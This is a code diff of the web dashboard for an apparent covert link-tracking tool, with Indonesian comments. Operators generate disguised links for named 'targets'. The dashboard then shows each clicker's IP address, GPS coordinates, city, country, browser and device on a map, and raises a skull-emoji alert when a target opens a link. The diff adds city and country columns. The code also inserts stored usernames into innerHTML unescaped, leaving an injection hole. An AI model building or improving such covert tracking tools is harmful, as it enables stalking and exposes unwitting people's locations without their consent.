@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: HACKER-UI DASHBOARD v3.4 (Audio Fix) ::</title>
+    <title>:: HACKER-UI DASHBOARD v3.8 (Akurat Peta) ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -18,55 +18,34 @@
 </head>
 <body>
     <audio id="notification-sound" src="/sounds/notif.mp3" preload="auto"></audio>
-
     <div class="dashboard-container">
         <div class="dashboard-panel panel-left">
             <h1 class="main-title">> CREATE_LINK.OP</h1>
             <form id="link-form" class="form-container">
-                <div class="input-group">
-                    <label for="username">> Enter Target ID:</label>
-                    <input type="text" id="username" class="hacker-input" required>
-                </div>
-                <div class="input-group">
-                    <label for="original-url">> Enter Destination URL:</label>
-                    <input type="url" id="original-url" class="hacker-input" placeholder="https://google.com" required>
-                </div>
-                <div class="input-group">
-                    <label for="expires-in">> Set Expiration:</label>
-                    <select id="expires-in" class="hacker-input">
-                        <option value="">Never</option>
-                        <option value="1">1 Hour</option>
-                        <option value="24">24 Hours</option>
-                        <option value="168">7 Days</option>
-                    </select>
-                </div>
+                <div class="input-group"><label for="username">> Enter Target ID:</label><input type="text" id="username" class="hacker-input" required></div>
+                <div class="input-group"><label for="original-url">> Enter Destination URL:</label><input type="url" id="original-url" class="hacker-input" placeholder="https://google.com" required></div>
+                <div class="input-group"><label for="expires-in">> Set Expiration:</label><select id="expires-in" class="hacker-input"><option value="">Never</option><option value="1">1 Hour</option><option value="24">24 Hours</option><option value="168">7 Days</option></select></div>
                 <button type="submit" id="submit-btn" class="hacker-button">[ GENERATE ]</button>
             </form>
             <div id="result-box" class="result-box" style="display:none;"></div>
-            
             <h1 class="main-title" style="margin-top: 30px;">> SYSTEM_STATS.LOG</h1>
             <div class="stats-grid">
                 <div class="stat-card"><div class="stat-value" id="total-links">0</div><div class="stat-label">Total Links</div></div>
                 <div class="stat-card"><div class="stat-value" id="total-clicks">0</div><div class="stat-label">Total Clicks</div></div>
                 <div class="stat-card"><div class="stat-value" id="total-locations">0</div><div class="stat-label">Locations Logged</div></div>
             </div>
-
             <h1 class="main-title" style="margin-top: 30px;">> TOP_5_LINKS.CHART</h1>
             <canvas id="topLinksChart"></canvas>
-
             <h1 class="main-title" style="margin-top: 30px;">> BROWSER_STATS.CHART</h1>
             <canvas id="browserChart"></canvas>
-
             <h1 class="main-title" style="margin-top: 30px;">> LIVE_LOGS.TXT</h1>
             <div id="log-section"></div>
         </div>
-
         <div class="dashboard-panel panel-right">
             <h1 class="main-title">> LINK_DATABASE.LNK</h1>
             <div id="links-section"><p class="highlight">> Establishing real-time connection...</p></div>
         </div>
     </div>
-
     <div id="map-modal" class="modal">
         <div class="modal-content">
             <span class="close-btn">×</span>
@@ -75,104 +54,23 @@
             <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
         </div>
     </div>
-
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        // --- Variabel Global & Selector ---
-        const linksSection = document.getElementById('links-section');
-        let topLinksChart;
-        let browserChart;
-        const linkForm = document.getElementById('link-form');
-        const submitBtn = document.getElementById('submit-btn');
-        const resultBox = document.getElementById('result-box');
-        const totalLinksEl = document.getElementById('total-links');
-        const totalClicksEl = document.getElementById('total-clicks');
-        const totalLocationsEl = document.getElementById('total-locations');
-        const modal = document.getElementById('map-modal');
-        const modalTitle = document.getElementById('modal-title');
-        const closeBtn = document.querySelector('.close-btn');
-        const mapActionsDiv = document.getElementById('map-actions');
-        const logSection = document.getElementById('log-section');
-        let map;
-        let markersLayer;
-
-        // --- Mekanisme Audio Baru ---
-        let isAudioEnabled = false;
-        const notificationSound = document.getElementById('notification-sound');
-        console.log('Audio element created. Ready for user interaction.');
-
-        function enableAudio() {
-            if (!isAudioEnabled) {
-                console.log('User interaction detected. Attempting to unlock audio...');
-                // Memainkan suara kosong sebentar untuk "membuka" izin audio
-                notificationSound.play().then(() => {
-                    notificationSound.pause();
-                    notificationSound.currentTime = 0;
-                    isAudioEnabled = true;
-                    console.log('✅ Audio unlocked successfully. Notifications will have sound.');
-                    // Hapus listener agar tidak berjalan lagi
-                    document.body.removeEventListener('click', enableAudio);
-                    document.body.removeEventListener('keydown', enableAudio);
-                }).catch(error => {
-                    console.error('❌ Audio unlock failed. Try clicking again.', error);
-                });
-            }
-        }
-        
-        document.body.addEventListener('click', enableAudio, { once: true });
-        document.body.addEventListener('keydown', enableAudio, { once: true });
-
-        // --- Koneksi Real-time Socket.IO ---
+        const linksSection = document.getElementById('links-section'), submitBtn = document.getElementById('submit-btn'), resultBox = document.getElementById('result-box'), totalLinksEl = document.getElementById('total-links'), totalClicksEl = document.getElementById('total-clicks'), totalLocationsEl = document.getElementById('total-locations'), modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = document.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions'), logSection = document.getElementById('log-section');
+        let topLinksChart, browserChart, map, markersLayer, isAudioEnabled = !1;
+        const linkForm = document.getElementById('link-form'), notificationSound = document.getElementById('notification-sound');
+        function enableAudio() { isAudioEnabled || (notificationSound.play().then(() => { notificationSound.pause(), notificationSound.currentTime = 0, isAudioEnabled = !0, console.log('✅ Audio unlocked successfully.'), document.body.removeEventListener('click', enableAudio), document.body.removeEventListener('keydown', enableAudio) }).catch(e => { console.error('❌ Audio unlock failed.', e) })) }
+        document.body.addEventListener('click', enableAudio, { once: !0 }), document.body.addEventListener('keydown', enableAudio, { once: !0 });
         const socket = io();
-        socket.on('connect', () => console.log('✅ Terhubung ke server via WebSocket!'));
-
-        socket.on('dashboard_update', (data) => {
-            updateLinksTable(data.links);
-            updateStats(data.stats);
-            updateTopLinksChart(data.links);
-            updateBrowserChart(data.browserStats);
-        });
-
-        socket.on('new_log_message', (msg) => {
-            const p = document.createElement('p');
-            p.textContent = msg;
-            logSection.appendChild(p);
-            logSection.scrollTop = logSection.scrollHeight;
-        });
-
-        socket.on('link_clicked', (data) => {
-            showClickNotification(data.username);
-        });
-
-        // --- Fungsi Notifikasi (Diperbarui) ---
-        function showClickNotification(username) {
-            console.log(`Received click from [${username}]. Is audio enabled? ${isAudioEnabled}`);
-            if (isAudioEnabled) {
-                notificationSound.currentTime = 0;
-                notificationSound.play().catch(e => console.error("Error playing sound:", e));
-            } else {
-                console.warn('Cannot play sound because user has not interacted with the page yet.');
-            }
-
-            const notification = document.createElement('div');
-            notification.className = 'click-notification';
-            notification.innerHTML = `<span>💀</span> Target [<strong>${username}</strong>] telah mengakses link!`;
-            document.body.appendChild(notification);
-
-            setTimeout(() => {
-                notification.style.opacity = '0';
-                setTimeout(() => notification.remove(), 500);
-            }, 5000);
-        }
-
-        // --- Sisa fungsi-fungsi lainnya (tidak ada perubahan) ---
+        function showClickNotification(e) { isAudioEnabled ? (notificationSound.currentTime = 0, notificationSound.play().catch(e => console.error("Error playing sound:", e))) : console.warn('Audio not enabled by user.'); const o = document.createElement('div'); o.className = 'click-notification', o.innerHTML = `<span>💀</span> Target [<strong>${e}</strong>] telah mengakses link!`, document.body.appendChild(o), setTimeout(() => { o.style.opacity = '0', setTimeout(() => o.remove(), 500) }, 5e3) }
+        
         function updateLinksTable(links = []) {
             if (links.length === 0) {
                 linksSection.innerHTML = "<p class='error'>> NO LINKS FOUND.</p>";
                 return;
             }
             let html = `<table class="hacker-table">
-                <thead><tr><th>Created At</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Last Clicked</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
+                <thead><tr><th>Created At</th><th>Link ID</th><th>Target ID</th><th>Kota</th><th>Negara</th><th>Clicks</th><th>Last Clicked</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
             links.forEach(r => {
                 const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
                 const statusClass = isExpired ? 'error' : 'highlight';
@@ -182,10 +80,14 @@
                     mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')">[ MAP ]</button>`;
                 }
                 const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ HAPUS ]</button>`;
+                const cityText = r.city || (r.click_count > 0 ? 'Processing...' : 'N/A');
+                const countryText = r.country || (r.click_count > 0 ? '...' : 'N/A');
                 html += `<tr>
                     <td>${new Date(r.created_at).toLocaleString('id-ID')}</td>
                     <td><a href="/${r.id}" target="_blank">${r.id}</a></td>
                     <td class="highlight">${r.username}</td>
+                    <td class="highlight">${cityText}</td>
+                    <td class="highlight">${countryText}</td>
                     <td class="highlight">${r.click_count}</td>
                     <td>${r.last_clicked_at ? new Date(r.last_clicked_at).toLocaleString('id-ID') : 'Never'}</td>
                     <td class="${statusClass}">${statusText}</td>
@@ -195,106 +97,56 @@
             html += "</tbody></table>";
             linksSection.innerHTML = html;
         }
-        function updateStats(stats) {
-            totalLinksEl.textContent = stats.total_links || 0;
-            totalClicksEl.textContent = stats.total_clicks || 0;
-            totalLocationsEl.textContent = stats.total_locations || 0;
-        }
-        function updateTopLinksChart(links = []) {
-            const ctx = document.getElementById('topLinksChart').getContext('2d');
-            const sortedLinks = [...links].sort((a,b)=>b.click_count - a.click_count).slice(0,5);
-            const labels = sortedLinks.map(l => l.id);
-            const data = sortedLinks.map(l => l.click_count);
-            if (topLinksChart) {
-                topLinksChart.data.labels = labels;
-                topLinksChart.data.datasets[0].data = data;
-                topLinksChart.update();
-            } else {
-                topLinksChart = new Chart(ctx, {
-                    type:'bar', data:{labels,datasets:[{label:'Total Clicks',data,backgroundColor:'rgba(0,255,65,0.5)',borderColor:'#00ff41',borderWidth:1}]},
-                    options:{indexAxis:'y',scales:{x:{ticks:{color:'#00ff41'}},y:{ticks:{color:'#00ff41'}}},plugins:{legend:{display:false}}}
-                });
+
+        function updateStats(e) { totalLinksEl.textContent = e.total_links || 0, totalClicksEl.textContent = e.total_clicks || 0, totalLocationsEl.textContent = e.total_locations || 0 }
+        function updateTopLinksChart(e = []) { const o = document.getElementById('topLinksChart').getContext('2d'), t = [...e].sort((e, o) => o.click_count - e.click_count).slice(0, 5), a = t.map(e => e.id), n = t.map(e => e.click_count); topLinksChart ? (topLinksChart.data.labels = a, topLinksChart.data.datasets[0].data = n, topLinksChart.update()) : topLinksChart = new Chart(o, { type: 'bar', data: { labels: a, datasets: [{ label: 'Total Clicks', data: n, backgroundColor: 'rgba(0,255,65,0.5)', borderColor: '#00ff41', borderWidth: 1 }] }, options: { indexAxis: 'y', scales: { x: { ticks: { color: '#00ff41' } }, y: { ticks: { color: '#00ff41' } } }, plugins: { legend: { display: !1 } } } }) }
+        function updateBrowserChart(e = {}) { const o = document.getElementById('browserChart').getContext('2d'), t = Object.keys(e), a = Object.values(e); browserChart ? (browserChart.data.labels = t, browserChart.data.datasets[0].data = a, browserChart.update()) : browserChart = new Chart(o, { type: 'pie', data: { labels: t, datasets: [{ data: a, backgroundColor: ['#00ff41', '#ff0041', '#41aaff', '#ffaa00', '#888888'] }] }, options: { plugins: { legend: { labels: { color: '#00ff41' } } } } }) }
+        async function deleteLink(e, o) { if (confirm(`Anda yakin ingin menghapus link untuk target '${o}' (${e})?\n\nSemua data lokasi terkait juga akan dihapus permanen!`)) try { const o = await fetch(`/api/links/${e}`, { method: 'DELETE' }); if ("success" !== (await o.json()).status) throw new Error('Gagal menghapus link.') } catch (e) { alert(`Error: ${e.message}`) } }
+        
+        // !!! FUNGSI showMapModal DIPERBARUI DENGAN LINK GOOGLE MAPS YANG BENAR !!!
+        async function showMapModal(id, name) {
+            modal.style.display = "block";
+            modalTitle.textContent = `> Location History for: ${name}`;
+            if (!map) {
+                const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' });
+                const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' });
+                map = L.map('map', { center: [-2.5489, 118.0149], zoom: 5, layers: [street] });
+                L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(map);
+                markersLayer = L.featureGroup().addTo(map);
             }
-        }
-        function updateBrowserChart(browserStats = {}) {
-            const ctx = document.getElementById('browserChart').getContext('2d');
-            const labels = Object.keys(browserStats);
-            const data = Object.values(browserStats);
-            if (browserChart) {
-                browserChart.data.labels = labels;
-                browserChart.data.datasets[0].data = data;
-                browserChart.update();
-            } else {
-                browserChart = new Chart(ctx, {
-                    type:'pie', data:{labels,datasets:[{data,backgroundColor:['#00ff41','#ff0041','#41aaff','#ffaa00','#888888']}]},
-                    options:{plugins:{legend:{labels:{color:'#00ff41'}}}}
-                });
-            }
-        }
-        async function deleteLink(id, username) {
-            const confirmation = confirm(`Anda yakin ingin menghapus link untuk target '${username}' (${id})?\n\nSemua data lokasi terkait juga akan dihapus permanen!`);
-            if (confirmation) {
-                try {
-                    const response = await fetch(`/api/links/${id}`, { method: 'DELETE' });
-                    const result = await response.json();
-                    if (result.status !== 'success') throw new Error(result.message || 'Gagal menghapus link.');
-                } catch (error) { alert(`Error: ${error.message}`); }
-            }
-        }
-        linkForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            submitBtn.textContent = "[ ...PROCESSING... ]";
-            submitBtn.disabled = true;
+            setTimeout(() => map.invalidateSize(), 1);
+            markersLayer.clearLayers();
+            mapActionsDiv.innerHTML = '';
             try {
-                const response = await fetch('/create', { 
-                    method: 'POST', headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify({ username: document.getElementById('username').value, originalUrl: document.getElementById('original-url').value, expiresIn: document.getElementById('expires-in').value }) 
-                });
-                const data = await response.json();
-                if (data.newLink) {
-                    resultBox.style.display = 'block';
-                    resultBox.innerHTML = `<p>> LINK GENERATED FOR <span class="highlight">${data.username}</span>: <a href="${data.newLink}" target="_blank">${data.newLink}</a></p>`;
-                } else { throw new Error(data.error); }
-            } catch (err) { 
-                resultBox.style.display = 'block'; 
-                resultBox.innerHTML = `<p class="error">> ERROR: ${err.message}</p>`;
-            } finally { 
-                submitBtn.textContent = "[ GENERATE ]"; 
-                submitBtn.disabled = false; 
-            }
-        });
-        function initMap() { 
-            if(!map){
-                const s=L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OSM'}),
-                      t=L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',{attribution:'© Esri'});
-                map=L.map('map',{center:[-2.5489,118.0149],zoom:5,layers:[s]}),
-                L.control.layers({"Street View":s,"Satellite View":t}).addTo(map),
-                markersLayer=L.featureGroup().addTo(map)
-            } 
-        }
-        async function showMapModal(id,name){
-            modal.style.display="block",
-            modalTitle.textContent=`> Location History for: ${name}`,
-            initMap(),
-            setTimeout(()=>map.invalidateSize(),1),
-            markersLayer.clearLayers(),
-            mapActionsDiv.innerHTML='';
-            try{
-                const e=await fetch(`/api/locations/${id}`), t=await e.json();
-                if(t&&t.length>0){
-                    t.forEach(o=>{
-                        const a=L.marker([o.latitude,o.longitude]);
-                        a.bindPopup(`<b>${new Date(o.created_at).toLocaleString()}</b><br>IP: ${o.ip_address}<br>${o.browser} on ${o.os}<br>${o.device.type} - ${o.device.vendor} ${o.device.model}`),
-                        markersLayer.addLayer(a)
+                const response = await fetch(`/api/locations/${id}`);
+                const locations = await response.json();
+                if (locations && locations.length > 0) {
+                    locations.forEach(loc => {
+                        const marker = L.marker([loc.latitude, loc.longitude]);
+                        const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
+                        marker.bindPopup(`<b>${new Date(loc.created_at).toLocaleString('id-ID')}</b><br>
+                            <strong>${locationString}</strong><br>
+                            IP: ${loc.ip_address}<br>
+                            ${loc.browser} on ${loc.os}<br>
+                            ${loc.device.type} - ${loc.device.vendor} ${loc.device.model}`);
+                        markersLayer.addLayer(marker);
                     });
-                    const n=t[0], s=`https://www.google.com/maps?q=${n.latitude},${n.longitude}`;
-                    mapActionsDiv.innerHTML=`<a href="${s}" target="_blank" class="hacker-button">[ LIHAT LEBIH DETAIL DI GOOGLE MAPS ]</a>`,
-                    map.fitBounds(markersLayer.getBounds())
-                }else alert("No location data found")
-            }catch(r){alert("Failed to fetch location data")}
+                    
+                    const latestLocation = locations[0];
+                    // Ini adalah format link Google Maps yang benar dan lebih akurat
+                    const googleMapsUrl = `https://www.google.com/maps?q=${latestLocation.latitude},${latestLocation.longitude}`;
+                    mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ LIHAT LEBIH DETAIL DI GOOGLE MAPS ]</a>`;
+
+                    map.fitBounds(markersLayer.getBounds());
+                } else {
+                    alert("No location data found for this link.");
+                }
+            } catch (err) {
+                alert("Failed to fetch location data.");
+            }
         }
-        closeBtn.onclick=()=>{modal.style.display="none"},
-        window.onclick=e=>{e.target==modal&&(modal.style.display="none")};
+
+        socket.on('connect', () => console.log('✅ Terhubung ke server via WebSocket!')), socket.on('dashboard_update', e => { updateLinksTable(e.links), updateStats(e.stats), updateTopLinksChart(e.links), updateBrowserChart(e.browserStats) }), socket.on('new_log_message', e => { const o = document.createElement('p'); o.textContent = e, logSection.appendChild(o), logSection.scrollTop = logSection.scrollHeight }), socket.on('link_clicked', e => { showClickNotification(e.username) }), linkForm.addEventListener('submit', async e => { e.preventDefault(), submitBtn.textContent = "[ ...PROCESSING... ]", submitBtn.disabled = !0; try { const e = await fetch('/create', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: document.getElementById('username').value, originalUrl: document.getElementById('original-url').value, expiresIn: document.getElementById('expires-in').value }) }), o = await e.json(); if (o.newLink) resultBox.style.display = 'block', resultBox.innerHTML = `<p>> LINK GENERATED FOR <span class="highlight">${o.username}</span>: <a href="${o.newLink}" target="_blank">${o.newLink}</a></p>`; else throw new Error(o.error) } catch (e) { resultBox.style.display = 'block', resultBox.innerHTML = `<p class="error">> ERROR: ${e.message}</p>` } finally { submitBtn.textContent = "[ GENERATE ]", submitBtn.disabled = !1 } }), closeBtn.onclick = () => { modal.style.display = "none" }, window.onclick = e => { e.target == modal && (modal.style.display = "none") };
     </script>
 </body>
 </html>
